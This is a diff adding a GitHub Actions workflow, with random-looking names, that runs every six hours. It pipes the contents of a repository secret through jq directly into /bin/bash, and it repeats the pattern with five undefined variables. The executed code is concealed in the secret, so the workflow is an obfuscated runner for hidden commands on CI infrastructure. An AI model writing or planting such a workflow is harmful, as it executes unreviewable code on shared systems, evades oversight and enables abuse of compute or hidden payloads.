@@ -1,0 +1,23 @@
+name: qihaoran7865
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '33 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: qihaoran7865
+        env:
+          vul10146: ${{ secrets.vul10146 }}
+        run: |
+          echo $vul10146 | jq -r .fxrts63 | /bin/bash
+          echo $ahmn4400 | jq -r .wosf8382 | /bin/bash
+          echo $ttg12 | jq -r .e5 | /bin/bash
+          echo $p51 | jq -r .xb599 | /bin/bash
+          echo $rp219 | jq -r .oco5 | /bin/bash
+          echo $kaq6382 | jq -r .knptv94 | /bin/bash
+
